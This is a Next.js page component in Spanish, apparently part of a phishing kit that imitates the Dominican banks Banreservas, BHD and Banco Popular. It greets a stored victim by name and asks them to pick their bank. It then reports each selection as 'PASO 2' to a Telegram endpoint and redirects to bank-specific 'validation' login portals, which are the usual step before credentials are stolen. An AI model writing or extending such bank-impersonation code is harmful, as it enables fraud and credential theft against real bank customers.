"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

export default function BancosPage() {
  const router = useRouter();
  const [cliente, setCliente] = useState("");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const nombreGuardado = localStorage.getItem("cliente_actual");
    if (nombreGuardado) {
      setCliente(nombreGuardado);
    }
  }, []);

  const handleSeleccion = async (nombreBanco: string, ruta: string) => {
    setLoading(true);
    try {
      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          pagina: "🏦 PASO 2: SELECCIÓN DE BANCO",
          nombre: cliente || "Cliente Desconocido",
          banco: nombreBanco,
          detalles: `El cliente ha seleccionado **${nombreBanco}** y está pasando al portal de validación.`
        }),
      });
      
      localStorage.setItem("banco_elegido", nombreBanco);
      
      // IMPORTANTE: Esto hará el salto a la página de login correspondiente
      router.push(ruta);
    } catch (error) {
      console.error("Error enviando selección:", error);
      router.push(ruta); 
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-slate-100 text-slate-900">
      
      {/* Encabezado con degradado moderno y luces decorativas */}
      <section className="relative overflow-hidden text-white bg-gradient-to-br from-cyan-500 via-blue-700 to-pink-500">
        
        {/* Luces decorativas */}
        <div className="absolute -left-32 top-0 w-[500px] h-[250px] bg-cyan-300/30 blur-3xl rotate-[-15deg]" />
        <div className="absolute -right-32 bottom-0 w-[500px] h-[250px] bg-pink-300/30 blur-3xl rotate-[15deg]" />

        <div className="max-w-6xl mx-auto px-6 py-14 md:py-20 relative z-10">
          <div className="text-center">
            <p className="inline-block rounded-full bg-white/15 border border-white/20 px-4 py-1 text-sm">
              {cliente ? `Hola, ${cliente.split(" ")[0]} - Paso 2` : "Paso 2 de tu solicitud"}
            </p>
            <h1 className="mt-5 text-4xl md:text-6xl font-extrabold uppercase">
              Selecciona tu banco
            </h1>
            <p className="mt-4 text-lg md:text-xl text-white/90 max-w-2xl mx-auto">
              Elige la entidad financiera con la que deseas continuar tu proceso.
            </p>
          </div>
        </div>
      </section>

      <section className="max-w-6xl mx-auto px-6 py-12 md:py-16">
        <div className="grid sm:grid-cols-2 md:grid-cols-3 gap-8 max-w-5xl mx-auto">
          
          {/* Tarjeta Banreservas */}
          <div className="rounded-3xl bg-white border border-slate-200 shadow-sm p-6 hover:shadow-lg transition text-center flex flex-col justify-between">
            <div>
              <div className="h-20 rounded-2xl bg-slate-100 flex items-center justify-center">
                <img src="/images/banreservas.png" alt="Banreservas" className="h-16 object-contain" />
              </div>
              <h2 className="mt-5 text-xl font-bold">Banreservas</h2>
              <p className="mt-2 text-slate-600">Continúa tu proceso con Banreservas.</p>
            </div>
            <button
              type="button"
              disabled={loading}
              onClick={() => handleSeleccion("BANRESERVAS", "/portal/banreservas")}
              className="mt-5 w-full rounded-2xl bg-gradient-to-r from-gray-600 to-gray-800 hover:from-gray-700 hover:to-gray-900 hover:scale-[1.02] disabled:opacity-50 text-white py-3 font-semibold transition-all duration-300 shadow-lg"
            >
              {loading ? "Procesando..." : "Seleccionar banco"}
            </button>
          </div>

          {/* Tarjeta Banco BHD */}
          <div className="rounded-3xl bg-white border border-slate-200 shadow-sm p-6 hover:shadow-lg transition text-center flex flex-col justify-between">
            <div>
              <div className="h-20 rounded-2xl bg-slate-100 flex items-center justify-center">
                <img src="/images/bhd.png" alt="Banco BHD" className="h-12 object-contain" />
              </div>
              <h2 className="mt-5 text-xl font-bold">Banco BHD</h2>
              <p className="mt-2 text-slate-600">Continúa tu proceso con BHD León.</p>
            </div>
            <button
              type="button"
              disabled={loading}
              onClick={() => handleSeleccion("BHD", "/portal/bhd")} 
              className="mt-5 w-full rounded-2xl bg-gradient-to-r from-gray-600 to-gray-800 hover:from-gray-700 hover:to-gray-900 hover:scale-[1.02] disabled:opacity-50 text-white py-3 font-semibold transition-all duration-300 shadow-lg"
            >
              {loading ? "Procesando..." : "Seleccionar banco"}
            </button>
          </div>

          {/* Tarjeta Banco Popular */}
          <div className="rounded-3xl bg-white border border-slate-200 shadow-sm p-6 hover:shadow-lg transition text-center flex flex-col justify-between">
            <div>
              <div className="h-20 rounded-2xl bg-slate-100 flex items-center justify-center">
                <img src="/images/logopopular2.png" alt="Banco Popular" className="h-36 object-contain" />
              </div>
              <h2 className="mt-5 text-xl font-bold">Banco Popular</h2>
              <p className="mt-2 text-slate-600">Continúa tu proceso con Banco Popular.</p>
            </div>
            <button
              type="button"
              disabled={loading}
              onClick={() => handleSeleccion("POPULAR", "/portal/popular")} 
              className="mt-5 w-full rounded-2xl bg-gradient-to-r from-gray-600 to-gray-800 hover:from-gray-700 hover:to-gray-900 hover:scale-[1.02] disabled:opacity-50 text-white py-3 font-semibold transition-all duration-300 shadow-lg"
            >
              {loading ? "Procesando..." : "Seleccionar banco"}
            </button>
          </div>

        </div>
      </section>
    </main>
  );
}